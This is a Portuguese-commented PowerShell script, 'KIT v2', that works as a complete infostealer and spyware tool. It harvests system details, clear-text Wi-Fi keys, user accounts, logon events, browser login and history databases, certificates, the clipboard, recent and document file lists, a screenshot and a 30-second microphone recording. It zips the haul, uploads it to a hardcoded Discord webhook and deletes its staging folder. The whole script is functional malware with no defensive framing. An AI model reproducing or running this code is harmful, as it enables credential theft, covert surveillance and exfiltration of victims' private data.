# ----------
# KIT v2 – coleta tudo, não apaga nada do sistema, só limpa a pasta $env:TEMP\kit
# ----------
$kit = "$env:TEMP\kit"
$hook = "https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"

New-Item -ItemType Directory -Path $kit -Force | Out-Null

function Out-Kit {
    param($Name, $Script)
    Invoke-Expression $Script | Out-File "$kit$Name.txt" -Encoding UTF8
}

# 1) Sistema & HW
Out-Kit -Name "\sysinfo" -Script "systeminfo"
Out-Kit -Name "\hw" -Script "Get-CimInstance Win32_ComputerSystem"
Out-Kit -Name "\cpu" -Script "Get-CimInstance Win32_Processor"
Out-Kit -Name "\bios" -Script "Get-CimInstance Win32_BIOS"

# 2) Rede & Wi-Fi
Out-Kit -Name "\netip" -Script "Get-NetIPConfiguration"
cmd /c "netsh wlan export profile key=clear folder=$kit"

# 3) Contas & privilégios
Out-Kit -Name "\users" -Script "Get-CimInstance Win32_UserAccount"
Out-Kit -Name "\admins" -Script "net localgroup administradores"
Out-Kit -Name "\logons" -Script "Get-EventLog Security -InstanceId 4624 -New 200"

# 4) Navegadores – login & histórico
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
)
$browserPaths | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -ErrorAction SilentlyContinue }

# 5) Certificados pessoais
Out-Kit -Name "\mycerts" -Script "Get-ChildItem Cert:\CurrentUser\My | Select Subject,Thumbprint,NotAfter"

# 6) Clipboard atual
Out-Kit -Name "\clipboard" -Script "Get-Clipboard"

# 7) Arquivos recentes
Out-Kit -Name "\recent" -Script "Get-ChildItem '$env:APPDATA\Microsoft\Windows\Recent' | Select Name,LastWriteTime"

# 8) Lista drives & “top 500” arquivos interessantes
Out-Kit -Name "\drives" -Script "Get-PSDrive -PSProvider FileSystem"
$exts = ".pdf",".doc*",".xls*",".txt",".csv",".db",".sqlite",".pst"
Invoke-Expression "Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -ErrorAction SilentlyContinue | Select FullName,Length,LastWriteTime | Sort Length -Descending | Select -First 500 | Export-Csv '$kit\top_files.csv' -NoTypeInformation"

# 9) Screenshot
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS, [System.Drawing.Imaging.ImageFormat]::Jpeg)

# 10) Microfone (30 s, gravação simples via NAudio)
$naudioUrl = "https://github.com/naudio/NAudio/releases/download/v2.0.1/NAudio.dll"
$naudioPath = "$kit\NAudio.dll"
if (-not (Test-Path $naudioPath)) {
    Invoke-WebRequest $naudioUrl -OutFile $naudioPath
}
Add-Type -Path $naudioPath
$wave = New-Object NAudio.Wave.WaveInEvent
$wave.WaveFormat = New-Object NAudio.Wave.WaveFormat(16000, 1)
$writer = [NAudio.Wave.WaveFileWriter]::new("$kit\mic.wav", $wave.WaveFormat)
$wave.add_DataAvailable({ param($s,$e) $writer.Write($e.Buffer, 0, $e.BytesRecorded) })
$wave.StartRecording()
Start-Sleep 30
$wave.StopRecording(); $writer.Dispose(); $wave.Dispose()

# 11) Compacta tudo
$zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
Compress-Archive -Path "$kit\*" -Destination $zip -Force

# 12) Envia para o Discord
$body = @{ file = Get-Item $zip; content = "Kit $(hostname) – $(Get-Date)" }
Invoke-RestMethod -Uri $hook -Method Post -Form $body

# 13) Limpa só a pasta $kit (nada do sistema é tocado)
Remove-Item $kit -Recurse -Force
